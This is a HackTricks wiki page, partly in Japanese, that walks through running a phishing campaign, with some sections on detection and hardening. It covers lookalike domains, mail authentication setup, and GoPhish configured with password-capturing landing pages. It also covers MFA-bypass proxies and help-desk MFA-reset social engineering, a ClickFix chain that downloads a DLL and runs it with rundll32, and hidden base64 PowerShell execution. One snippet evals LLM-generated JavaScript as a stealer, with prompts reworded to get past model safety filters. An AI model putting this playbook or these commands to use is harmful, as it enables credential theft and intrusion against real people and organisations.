# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## 方法論

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 設定

**TLS証明書の設定**

このステップの前に、**すでに購入したドメイン**を用意しておく必要があり、それは設定している**gophish**の**VPSのIP**を**指している**必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

インストールを開始: `apt-get install postfix`

次に、ドメインを以下のファイルに追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に **`/etc/hostname`** と **`/etc/mailname`** をあなたのドメイン名に変更し、**VPSを再起動してください。**

次に、`mail.<domain>` の **DNS A record** を VPS の **ip address** を指すよう作成し、`mail.<domain>` を指す **DNS MX** record を作成します。

では、メール送信をテストします:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 設定**

gophish の実行を停止して、設定を行います。\
`/opt/gophish/config.json` を以下の内容に変更してください（https の使用に注意）:
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophishサービスの設定**

gophishサービスを自動起動およびサービスとして管理できるようにするには、次の内容で `/etc/init.d/gophish` ファイルを作成します:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
サービスの設定を完了し、動作確認を行う:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバとドメインの設定

### 待つ & 正当性を保つ

ドメインが古いほど、スパムとして検知される可能性は低くなります。したがって、phishing assessment の前にできるだけ長く（少なくとも1週間）待つべきです。さらに、評判に関わる内容のページを用意すると、得られる評判は良くなります。

たとえ1週間待つ必要があっても、今すぐにすべての設定を完了させておくことはできます。

### Reverse DNS (rDNS) レコードの設定

VPS の IP アドレスがドメイン名に解決されるように、rDNS (PTR) レコードを設定してください。

### Sender Policy Framework (SPF) レコード

You must **新しいドメイン用に SPF レコードを設定する必要があります**。SPF レコードが何かわからない場合は[**このページを読む**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

SPF ポリシーを生成するには [https://www.spfwizard.net/](https://www.spfwizard.net) を使えます（VPS の IP を使用してください）

![](<../../images/image (1037).png>)

これはドメインの TXT レコードに設定すべき内容です:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースのメッセージ認証、レポーティング & コンフォーマンス (DMARC) レコード

新しいドメインに対して**DMARC レコードを設定する必要があります**。DMARC レコードが何か分からない場合は[**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指す新しい DNS TXT レコードを次の内容で作成してください：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

新しいドメインに対して**DKIMを設定する必要があります**。DMARCレコードが何かわからない場合は[**このページを読む**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIMキーが生成する2つのB64値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

これは[https://www.mail-tester.com/](https://www.mail-tester.com/)\ を使って行えます。ページにアクセスして、表示されるアドレスにメールを送信してください:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
`check-auth@verifier.port25.com` にメールを送信して、**メール設定を確認する**ことや、**応答を確認する**こともできます（このためにはポート**25**を**開放**し、rootとしてメールを送信した場合はファイル _/var/mail/root_ で応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
自分で管理している **Gmail** にメッセージを送って、Gmail の受信トレイで **メールヘッダー** を確認できます。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist からの削除

The page [www.mail-tester.com](https://www.mail-tester.com) は、あなたのドメインが spamhouse によってブロックされているかどうかを示してくれます。ドメイン/IP の削除は次で依頼できます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist からの削除

ドメイン/IP の削除は [https://sender.office.com/](https://sender.office.com) で依頼できます。

## Create & Launch GoPhish Campaign

### Sending Profile

- 送信プロファイルを識別するための**名前**を設定する
- どのアカウントから phishing メールを送るか決める。提案: _noreply, support, servicedesk, salesforce..._
- username と password を空欄にしてもよいが、必ず「Ignore Certificate Errors」をチェックすること

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 動作確認には「**Send Test Email**」機能を使うことを推奨します。\
> テスト中にブロックされないよう、**テストメールは 10min mail のアドレスへ送ること**をおすすめします。

### Email Template

- テンプレートを識別するための**名前**を設定する
- 次に**件名 (subject)** を記入（不自然なものは避け、通常のメールで見かける内容に）
- 「**Add Tracking Image**」にチェックが入っていることを確認する
- メールテンプレートを作成する（以下の例のように変数を使用できます）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **メールの信頼性を高めるために**, クライアントのメールにある署名を使うことをおすすめします。提案:

- 存在しないアドレスにメールを送り、返信に署名があるか確認する。
- info@ex.com や press@ex.com、public@ex.com のような **公開メールアドレス** を探してメールを送り、返信を待つ。
- 発見した **有効なメールアドレス** に連絡を取り、返信を待つ。

![](<../../images/image (80).png>)

> [!TIP]
> Email Template はファイルを添付して送ることもできます。特別に作成したファイル/ドキュメントを使って NTLM チャレンジを盗みたい場合は、[このページを読む](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 名前を入力する
- ウェブページの **HTMLコードを書く**。ウェブページを **インポート** できることに注意。
- 「Capture Submitted Data」と「Capture Passwords」にチェックを入れる
- リダイレクトを設定する

![](<../../images/image (826).png>)

> [!TIP]
> 通常、ページの HTML コードを修正し、ローカル（場合によっては Apache サーバーを使用）でテストを行い、**納得がいくまで**調整する必要があります。その後、その HTML コードをボックスに書き込みます。\
> HTML で **静的リソースを使用する** 必要がある場合（CSS や JS など）は、それらを _**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> リダイレクトについては、被害者の正規のメインページへ **リダイレクト** するか、例えば _/static/migration.html_ にリダイレクトして、5 秒間 **スピニングホイール（**[**https://loading.io/**](https://loading.io)**）** を表示し、その後処理が成功したことを表示する、などが考えられます。

### Users & Groups

- 名前を設定する
- **データをインポートする**（テンプレートを例で使うには各ユーザーの 名 (firstname)、姓 (last name)、メールアドレス (email address) が必要です）

![](<../../images/image (163).png>)

### Campaign

最後に、名前、メールテンプレート、ランディングページ、URL、送信プロファイル、グループを選んでキャンペーンを作成します。URL は被害者に送られるリンクになります。

送信プロファイルでは、最終的なフィッシングメールがどのように見えるかを確認するためのテストメールを送信できます:

![](<../../images/image (192).png>)

> [!TIP]
> テスト中にブラックリスト入りを避けるため、テストメールは **10min mails のアドレス** に送ることをおすすめします。

準備が整ったら、キャンペーンを開始するだけです！

## Website Cloning

何らかの理由でウェブサイトをクローンしたい場合は、次のページを確認してください：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部のフィッシング評価（主に Red Teams）では、バックドアを含むファイル（C2 か、認証をトリガーするだけのもの）を送信したい場合があります。\
例については次のページを参照してください：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の攻撃は、本物のウェブサイトを偽装してユーザーが入力した情報を収集するという点で非常に巧妙です。残念ながら、ユーザーが正しいパスワードを入力しなかった場合や、偽装したアプリケーションが 2FA で保護されている場合、**これらの情報だけでは被害ユーザーになりすますことはできません**。

ここで [**evilginx2**](https://github.com/kgretzky/evilginx2)、[**CredSniper**](https://github.com/ustayready/CredSniper) および [**muraena**](https://github.com/muraenateam/muraena) のようなツールが有用になります。これらのツールは MitM 型の攻撃を生成することを可能にします。基本的に攻撃は次のように動作します：

1. 実際のウェブページのログインフォームを **偽装する**。
2. ユーザーが偽ページに **資格情報** を送信し、ツールがそれを実際のウェブページに送って、**資格情報が有効か確認する**。
3. アカウントが **2FA** で保護されている場合、MitM ページはそれを要求し、ユーザーが入力するとツールが実際のウェブページに送信する。
4. ユーザーが認証されると、攻撃者は MitM 中に行われたすべてのやり取りから **資格情報、2FA、クッキー、その他の情報** を取得できます。

### Via VNC

被害者を本物と同じ見た目の悪意あるページへ **誘導する** 代わりに、実際のウェブページに接続されたブラウザを動かしている **VNC セッションに接続させる** としたらどうなるでしょうか？ 被害者の操作を確認でき、パスワード、使用した MFA、クッキーなどを盗むことができます。\
これには [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) を使えます。

## Detecting the detection

自分が検出されたかどうかを知る最良の方法の一つは、**自分のドメインがブラックリストに載っていないか検索すること**です。リストに載っていれば、何らかの方法でドメインが疑わしいと検出されたことになります。\
ドメインがブラックリストに載っているか簡単に確認するには [https://malwareworld.com/](https://malwareworld.com) を使うとよいでしょう。

しかし、被害者が実際に **疑わしいフィッシング活動を積極的に探している** かどうかを知る他の方法もあります。詳しくは次を参照：


{{#ref}}
detecting-phising.md
{{#endref}}

被害者のドメインに非常に似た名前のドメインを **購入** したり、あなたが管理するドメインの **サブドメイン** に対して被害者ドメインの **キーワードを含む** 証明書を **発行** することができます。もし被害者がそれらに対して DNS や HTTP で何らかのやり取りを行えば、被害者が**積極的に疑わしいドメインを探している**ことが分かり、その場合は非常に慎重に行動する必要があります。

### Evaluate the phishing

[**Phishious**](https://github.com/Rices/Phishious) を使って、あなたのメールがスパムフォルダに入るか、ブロックされるか、成功するかを評価してください。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

近年の侵入グループはメール誘導を完全にスキップし、MFA を回避するために **サービスデスク／identity-recovery ワークフローを直接標的にする** ことが増えています。この攻撃は完全に「living-off-the-land」であり、オペレータが有効な資格情報を手に入れれば、組み込みの管理ツールで横展開し、マルウェアは不要です。

### Attack flow
1. Recon the victim
* LinkedIn、データ漏洩、public GitHub などから個人・企業情報を収集する。
* 価値の高いアカウント（経営陣、IT、経理など）を特定し、パスワード／MFA リセットに関する**正確なヘルプデスク手順**を列挙する。
2. Real-time social engineering
* 電話、Teams、チャットでターゲットになりすましてヘルプデスクに連絡する（多くの場合 **spoofed caller-ID** や **cloned voice** を使用）。
* 事前に収集した PII を提示して知識ベースの認証を通過させる。
* エージェントを説得して **MFA シークレットをリセット** させるか、登録された携帯番号で **SIM-swap** を実行させる。
3. Immediate post-access actions (≤60 min in real cases)
* 任意の web SSO ポータルを経由して足場を確立する。
* 組み込みツールで AD / AzureAD を列挙する（バイナリは投下しない）:
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 既にホワイトリストに登録された環境内の正当な **RMM** エージェントや **WMI**、**PsExec** を使って横展開する。

### Detection & Mitigation
* ヘルプデスクの identity recovery を**特権操作**として扱い、ステップアップ認証とマネージャー承認を要求する。
* 次のようなアラートを出す **Identity Threat Detection & Response (ITDR)** / **UEBA** ルールを展開する：
* MFA 方法が変更された + 新しいデバイス／ジオからの認証
* 同じプリンシパルの即時昇格（user→admin）
* ヘルプデスク通話を録音し、リセット前に**既に登録された番号への折り返し**を義務付ける。
* Just-In-Time (JIT) / Privileged Access を実装し、リセット直後のアカウントが自動的に高権限トークンを継承しないようにする。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
大量攻撃によりハイタッチ運用のコストを相殺する一般的なグループは、**検索エンジンと広告ネットワークを配信チャネルに変える**。

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような偽の結果を検索広告の上位に表示させる。
2. 被害者は小さな **first-stage loader**（多くは JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. ローダーはブラウザのクッキーや資格情報DBを外部送信し、その後 **silent loader** を取得して、*リアルタイムで*何を展開するか判断する：
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* 新規登録ドメインをブロックし、検索広告だけでなくメールにも **Advanced DNS / URL Filtering** を適用する。
* ソフトウェアのインストールを署名付き MSI / ストアパッケージに制限し、`HTA`, `ISO`, `VBS` の実行をポリシーで拒否する。
* ブラウザの子プロセスがインストーラーを開く事象を監視する:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader によく悪用される LOLBins（例: `regsvr32`, `curl`, `mshta`）を監視する。

### ClickFix DLL delivery tradecraft (fake CERT update)
* 誘い文句: クローンされた国の CERT アドバイザリで、ステップバイステップの「修正」手順を表示する **Update** ボタンがある。被害者には DLL をダウンロードして `rundll32` で実行するバッチを実行するように指示される。
* 観測された典型的なバッチチェーン:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` はペイロードを `%TEMP%` に保存し、短いスリープでネットワークのジッターを隠し、その後 `rundll32` がエクスポートされたエントリポイント（`notepad`）を呼び出す。
* DLL はホスト識別をビーコンし、数分ごとに C2 をポーリングする。リモートコマンドは **base64-encoded PowerShell** として到着し、隠れてポリシーをバイパスして実行される:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性が保たれ（サーバーは DLL を更新せずにタスクを切り替え可能）、コンソールウィンドウが隠れる。`rundll32.exe` の子として実行される PowerShell で `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` が同時に使われているものを狩るとよい。
* 防御側は `...page.php?tynor=<COMPUTER>sss<USER>` のような HTTP(S) コールバックや、DLL ロード後の 5 分間隔のポーリングを探すことができる。

---

## AI-Enhanced Phishing Operations
攻撃者は現在、**LLM と voice-clone API** を連携させ、完全に個別化された誘いとリアルタイムのやり取りを行っています。

| レイヤー | 脅威アクターによる使用例 |
|-------|-----------------------------|
| 自動化 (Automation) | ランダム化された文言とトラッキングリンクで >100k のメール/SMS を生成・送信する。 |
| Generative AI | 公開された M&A、ソーシャルメディアの内輪ネタに言及する *一回限りの* メールを生成；コールバック詐欺で CEO のディープフェイク音声を使用。 |
| Agentic AI | ドメインを自律的に登録し、オープンソースの情報をスクレイピングし、被害者がクリックしたが資格情報を送信しなかった場合に次段階のメールを自動で作成する。 |

Defence:
• 信頼されていない自動化から送信されたメッセージを強調する **動的バナー** を追加する（ARC/DKIM の異常を利用）。  
• 高リスクの電話要求には **音声生体認証のチャレンジフレーズ** を導入する。  
• 意識向上プログラムで継続的に AI 生成の誘いをシミュレートする — 静的なテンプレートは時代遅れ。

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻撃者は一見無害な HTML を配布し、信頼された LLM API に JavaScript を生成させてそれをブラウザ内で実行（例: `eval` や動的 `<script>`）することで、ランタイムに **stealer を生成する** ことができます。

1. **Prompt-as-obfuscation:** プロンプトに exfil URL/Base64 文字列をエンコードし、安全フィルタを回避して幻覚を減らすために文言を繰り返し調整する。
2. **Client-side API call:** ロード時に JS が公共の LLM (Gemini/DeepSeek 等) や CDN プロキシに呼び出しを行う；静的 HTML にはプロンプト/API 呼び出しのみが存在する。
3. **Assemble & exec:** レスポンスを連結して実行する（訪問ごとに多形化される）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードは誘い文句を個別化（例: LogoKit トークンの解析）し、認証情報をプロンプトに隠されたエンドポイントへ送信する。

**Evasion traits**
- トラフィックがよく知られた LLM ドメインや信頼される CDN プロキシに到達する；時には WebSockets を介してバックエンドへ。
- 静的なペイロードは存在しない；悪意ある JS はレンダー後にのみ現れる。
- 非決定論的な生成はセッションごとに**ユニークな**stealers を生み出す。

**Detection ideas**
- JS を有効にしたサンドボックスを実行し、**LLM レスポンスに由来するランタイム `eval`/動的スクリプト生成**を検出する。
- 返却されたテキストに対して直後に `eval`/`Function` が実行される、LLM API へのフロントエンド POST を捜索する。
- クライアントのトラフィックに許可されていない LLM ドメインが見られ、続いて認証情報の POST がある場合にアラートを出す。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
従来の push-bombing に加え、オペレータはヘルプデスクの通話中に単に **新しい MFA 登録を強制** し、ユーザの既存トークンを無効化する。以降に表示されるログインプロンプトは被害者にとって正当なものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without any download or attachment.

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* The APK embeds static credentials and per-profile “unlock codes” (no server auth). Victims follow a fake exclusivity flow (login → locked profiles → unlock) and, on correct codes, are redirected into WhatsApp chats with attacker-controlled `+92` numbers while spyware runs silently.
* Collection starts even before login: immediate exfil of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). A content observer auto-uploads new photos; a scheduled job re-scans for new documents every **5 minutes**.
* Persistence: registers for `BOOT_COMPLETED` and keeps a **foreground service** alive to survive reboots and background evictions.

### WhatsApp device-linking hijack via QR social engineering
* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
* Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` ロジック（簡略化）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーでよく観察される挙動:
- 最初の読み込み時にセッションCookieを設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` のとき、以降の GET に対して 500（またはプレースホルダ）を返す。`true` の場合のみフィッシングを配信する。

Hunting and detection heuristics:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非モバイルでは HTTP 500；正当なモバイル被害者の経路は 200 を返し、続く HTML/JS を配信する。
- `ontouchstart` や類似のデバイスチェックのみでコンテンツを条件付けしているページはブロックまたは精査する。

Defence tips:
- モバイルライクな指紋を使い、JS を有効にしたクローラーで実行してゲートされたコンテンツを検出する。
- 新規登録ドメインで `POST /detect` に続く疑わしい 500 レスポンスを検知してアラートする。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
